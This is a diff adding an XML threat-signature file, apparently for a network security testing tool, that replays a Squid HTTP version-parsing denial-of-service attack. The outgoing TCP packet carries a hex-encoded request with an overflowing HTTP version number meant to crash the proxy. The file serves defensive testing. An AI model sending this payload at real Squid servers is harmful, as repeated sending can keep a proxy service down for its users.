@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Squid HTTP Version Number Parsing Denial of Service"/>
+    <EngDesc display="true" value="There exists a denial of service vulnerability in the way Squid handles HTTP version number. The vulnerability is due to inappropriate parsing the version number when processing malformed HTTP requests. Remote unauthenticated attackers can exploit this vulnerability by sending specially crafted HTTP request packets to an affected system. Successful exploitation may cause the service to terminate.            Upon receiving a crafted HTTP request message, the Squid proxy server will terminate and reset all established connections. However, the Squid monitor process will re-spawn the worker process automatically which restores the proxy services. If the attack is launched continuously, the target Squid proxy may be put into a lasting denial-of-service condition."/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="TCP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Squid_Project"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Squid_Project_Squid_Project_Squid"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20090204-19"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value="33604"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="b227f5afc3516eba68435eaf6a1d8f5d"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="not-required"/>
+    <IntegImpact display="false" value="not-required"/>
+    <AvailImpact display="false" value="Complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633753951874732974"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1250667222" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="I"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="J"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="K"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="L"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="M"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+    <for index="E"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0066" Identification="636D" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="7561" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$destPort" SeqNumber="25944D18" AckNumber="C8AE5195" HeaderLength="08" WindowSize="002E" Checksum="2936" UrgentPointer="0000" Options="0101080AE3B92E7D005CEC29" Payload="47455420687474703A2F2F776861742E657665722F20485454502F343239343936373239352E343239343936373239350A0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="E" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="BDBC" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="1B44" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="C8AE5195" AckNumber="25944D4A" HeaderLength="08" WindowSize="016A" Checksum="D183" UrgentPointer="0000" Options="0101080A005CEC29E3B92E7D" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
